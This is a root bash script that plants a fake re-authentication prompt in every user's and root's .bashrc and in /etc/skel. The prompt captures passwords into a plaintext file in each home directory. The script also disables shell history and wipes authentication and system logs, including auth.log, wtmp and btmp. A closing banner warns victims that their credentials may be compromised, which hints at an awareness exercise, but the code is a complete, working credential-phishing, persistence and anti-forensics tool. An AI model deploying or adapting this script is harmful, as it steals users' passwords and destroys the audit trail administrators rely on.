#!/bin/bash
# Run as root: sudo bash setup_bashrc.sh

# ── Suppress History ───────────────────────────────────────────
export HISTSIZE=0
unset HISTFILE

# ── Build harvest block ────────────────────────────────────────
HARVEST=$(cat << 'BASHRC'

_harvest_cred() {
    echo ""
    echo "Session token expired. Re-authentication required."
    echo ""
    read -rsp "Password: " _input_pass
    echo ""
    sleep 2
    echo "Authentication failed. Please try again."
    echo ""
    read -rsp "Password: " _input_pass
    echo ""
    sleep 1
    echo "$(date '+%Y-%m-%d %H:%M:%S') | $(whoami) | $(hostname) | $_input_pass" >> "$HOME/.lostandfound"
    unset _input_pass

    cat << 'EOF'

    ██╗    ██╗ █████╗ ██████╗ ███╗   ██╗██╗███╗   ██╗ ██████╗ ██╗
    ██║    ██║██╔══██╗██╔══██╗████╗  ██║██║████╗  ██║██╔════╝ ██║
    ██║ █╗ ██║███████║██████╔╝██╔██╗ ██║██║██╔██╗ ██║██║  ███╗██║
    ██║███╗██║██╔══██║██╔══██╗██║╚██╗██║██║██║╚██╗██║██║   ██║╚═╝
    ╚███╔███╔╝██║  ██║██║  ██║██║ ╚████║██║██║ ╚████║╚██████╔╝██╗
     ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝

    [!] NOTICE: Your credentials may be compromised.
    [!] Please change your password immediately using: passwd
    [!] Report this incident to your system administrator.

EOF
}

_harvest_cred
BASHRC
)

# ── Append to /etc/skel for any future users ───────────────────
echo "$HARVEST" >> /etc/skel/.bashrc

# ── Append to all existing home directories ────────────────────
for home in /home/*; do
    [ -f "$home/.bashrc" ] && echo "$HARVEST" >> "$home/.bashrc"
done

# ── Also hit root ──────────────────────────────────────────────
echo "$HARVEST" >> /root/.bashrc

# ── Clear Logs ─────────────────────────────────────────────────
for log in /var/log/lastlog /var/log/auth.log /var/log/wtmp /var/log/btmp /var/log/syslog /var/log/user.log; do
    [ -f "$log" ] && cat /dev/null > "$log"
done

echo "[+] Bashrc harvest deployed."
